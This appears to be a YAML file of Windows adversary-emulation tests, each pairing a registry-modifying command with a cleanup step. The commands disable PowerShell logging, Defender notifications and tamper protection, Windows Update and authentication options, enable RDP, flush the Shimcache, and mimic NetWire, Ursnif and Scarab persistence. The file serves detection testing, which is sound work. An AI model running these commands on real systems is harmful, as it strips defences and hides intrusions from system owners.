    - name: Disable Windows Change Password Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable Windows Lock Workstation Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoDesktop Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoRun Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoFind Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoControlPanel Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoFileMenu Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoClose Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoSetTaskbar Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoTrayContextMenu Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Activate Windows NoPropertiesMyDocuments Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Hide Windows Clock Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows HideSCAHealth Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows HideSCANetwork Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows HideSCAPower Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows HideSCAVolume Group Policy Feature
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows Modify Show Compress Color And Info Tip Registry
      type: cmd
      platform: windows
      command: |-
        reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f
        reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
      cleanup: |-
        reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /f >nul 2>&1
        reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /f >nul 2>&1
      timeout: 120
    - name: Windows Powershell Logging Disabled
      type: cmd
      platform: windows
      command: |-
        reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
        reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
        reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
        reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
        reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1
      cleanup: |-
        reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /f >nul 2>&1
        reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1
        reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows Add Registry Value to Load Service in Safe Mode without Network
      type: cmd
      platform: windows
      command: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
      cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /f
      timeout: 120
      elevation_required: true
    - name: Windows Add Registry Value to Load Service in Safe Mode with Network
      type: cmd
      platform: windows
      command: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
      cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /f
      timeout: 120
      elevation_required: true
    - name: Disable Windows Toast Notifications
      type: cmd
      platform: windows
      command: reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
      cleanup: reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable Windows Security Center Notifications
      type: cmd
      platform: windows
      command: reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
      cleanup: reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Suppress Win Defender Notifications
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Allow RDP Remote Assistance Feature
      type: cmd
      platform: windows
      command: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: NetWire RAT Registry Key Creation
      type: cmd
      platform: windows
      command: |-
        reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d "C:\Users\admin\AppData\Roaming\Install\Host.exe" /f
        reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f
        reg add HKCU\SOFTWARE\NetWire /v "Install Date" /t REG_SZ /d "2021-08-30 07:17:27" /f
      cleanup: |-
        reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /f >nul 2>&1
        reg delete HKCU\SOFTWARE\NetWire /va /f >nul 2>&1
        reg delete HKCU\SOFTWARE\NetWire /f >nul 2>&1
      timeout: 120
    - name: Ursnif Malware Registry Key Creation
      type: cmd
      platform: windows
      command: reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
      cleanup: |-
        reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1
        reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /f >nul 2>&1
      timeout: 120
    - name: Terminal Server Client Connection History Cleared
      type: cmd
      platform: windows
      command: |-
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
      timeout: 120
      elevation_required: true
    - name: Disable Windows Error Reporting Settings
      type: cmd
      platform: windows
      command: |-
        reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
        reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
      cleanup: |-
        reg delete HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
        reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: DisallowRun Execution Of Certain Applications
      type: cmd
      platform: windows
      command: |-
        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f
        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d "regedit.exe"
        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d "cmd.exe"
      cleanup: |-
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /f >nul 2>&1
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art1 /f >nul 2>&1
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art2 /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Enabling Restricted Admin Mode via Command_Prompt
      type: cmd
      platform: windows
      command: reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
      cleanup: reg delete "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Mimic Ransomware - Enable Multiple User Sessions
      type: cmd
      platform: windows
      command: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
      cleanup: reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Mimic Ransomware - Allow Multiple RDP Sessions per User
      type: cmd
      platform: windows
      command: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
      cleanup: reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Event Viewer Registry Modification - Redirection URL
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionURL /t REG_SZ /d "file://C:\windows\system32\notepad.exe" /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionURL /t REG_SZ /d "http://go.microsoft.com/fwlink/events.asp" /f
      timeout: 120
      elevation_required: true
    - name: Event Viewer Registry Modification - Redirection Program
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d "C:\windows\system32\notepad.exe" /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f
      timeout: 120
      elevation_required: true
    - name: Enabling Remote Desktop Protocol via Remote Registry
      type: cmd
      platform: windows
      command: reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
      cleanup: reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 2 /f
      timeout: 120
      elevation_required: true
    - name: Disable Win Defender Notification
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 0 /f
      timeout: 120
      elevation_required: true
    - name: Disable Windows OS Auto Update
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 0 /f
      timeout: 120
      elevation_required: true
    - name: Disable Windows Auto Reboot for current logon user
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d 0 /f
      timeout: 120
      elevation_required: true
    - name: Windows Auto Update Option to Notify before download
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 3 /f
      timeout: 120
      elevation_required: true
    - name: Do Not Connect To Win Update
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 0 /f
      timeout: 120
      elevation_required: true
    - name: Tamper Win Defender Protection
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 5 /f
      timeout: 120
      elevation_required: true
    - name: Snake Malware Registry Blob
      type: powershell
      platform: windows
      command: $typicalPath = "HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name "AtomicSnake" -Value $randomBytes -PropertyType Binary -Force | Out-Null
      cleanup: $typicalPath = "HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds"; Remove-ItemProperty -Path $typicalPath -Name "AtomicSnake" -ErrorAction SilentlyContinue | Out-Null
      timeout: 120
      elevation_required: true
    - name: Allow Simultaneous Download Registry
      type: cmd
      platform: windows
      command: |-
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d 10 /f
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d 10 /f
      cleanup: |-
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /f
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /f
      timeout: 120
      elevation_required: true
    - name: Modify Internet Zone Protocol Defaults in Current User Registry - cmd
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 0 /F
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 0 /F
      cleanup: |-
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 3 /F
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 3 /F
      timeout: 120
    - name: Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell
      type: powershell
      platform: windows
      command: |-
        # Set the registry values for http and https to 0
        Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0
        Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0
      cleanup: |-
        # Restore the registry values for http and https to 3
        Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 3
        Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 3
      timeout: 120
    - name: Activities To Disable Secondary Authentication Detected By Modified Registry Value.
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 1 /f
      timeout: 120
    - name: Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 1 /f
      timeout: 120
    - name: Scarab Ransomware Defense Evasion Activities
      type: cmd
      platform: windows
      command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
      cleanup: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Disable Remote Desktop Anti-Alias Setting Through Registry
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Disable Remote Desktop Security Settings Through Registry
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
      cleanup: reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Disabling ShowUI Settings of Windows Error Reporting (WER)
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Windows\Windows Error Reporting" /v DontShowUI /t REG_DWORD /d 1 /f
      cleanup: reg add "HKCU\Software\Microsoft\Windows\Windows Error Reporting" /v DontShowUI /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Enable Proxy Settings
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
      cleanup: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Set-Up Proxy Server
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "proxy.atomic-test.com:8080" /f
      cleanup: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /f
      timeout: 120
    - name: RDP Authentication Level Override
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Terminal Server Client" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f
      cleanup: reg delete "HKCU\Software\Microsoft\Terminal Server Client" /v AuthenticationLevelOverride
      timeout: 120
    - name: Enable RDP via Registry (fDenyTSConnections)
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
      cleanup: if 0 EQU 1 (reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
      timeout: 120
      elevation_required: true
    - name: Disable Windows Prefetch Through Registry
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d 3 /f
      timeout: 120
      elevation_required: true
    - name: Setting Shadow key in Registry for RDP Shadowing
      type: powershell
      platform: windows
      command: |-
        $s= New-CimSession -Computername localhost -SessionOption (New-CimSessionOption -Protocol Dcom)
        Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s | Invoke-CimMethod -MethodName Enable
        Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="shadow"; uValue=[uint32]2} -CimSession $s
      cleanup: Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
      timeout: 120
      elevation_required: true
    - name: Flush Shimcache
      type: cmd
      platform: windows
      command: Rundll32.exe apphelp.dll,ShimFlushCache
      timeout: 120
      elevation_required: true
    - name: Disable Windows Remote Desktop Protocol
      type: cmd
      platform: windows
      command: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
      timeout: 120
      elevation_required: true
    - name: Enforce Smart Card Authentication Through Registry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v scforceoption /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v scforceoption /f
      timeout: 120
      elevation_required: true
    - name: Requires the BitLocker PIN for Pre-boot authentication
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseAdvancedStartup /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseAdvancedStartup /f
      timeout: 120
      elevation_required: true
    - name: Modify EnableBDEWithNoTPM Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f
      cleanup: reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /f
      timeout: 120
      elevation_required: true
    - name: Modify UseTPM Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPM /t REG_DWORD /d 2 /f
      cleanup: reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /f
      timeout: 120
      elevation_required: true
    - name: Modify UseTPMPIN Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMPIN /t REG_DWORD /d 2 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMPIN /f
      timeout: 120
      elevation_required: true
    - name: Modify UseTPMKey Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMKey /t REG_DWORD /d 2 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMKey /f
      timeout: 120
      elevation_required: true
    - name: Modify UseTPMKeyPIN Registry entry
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f
      cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v UseTPMKeyPIN /f
      timeout: 120
      elevation_required: true
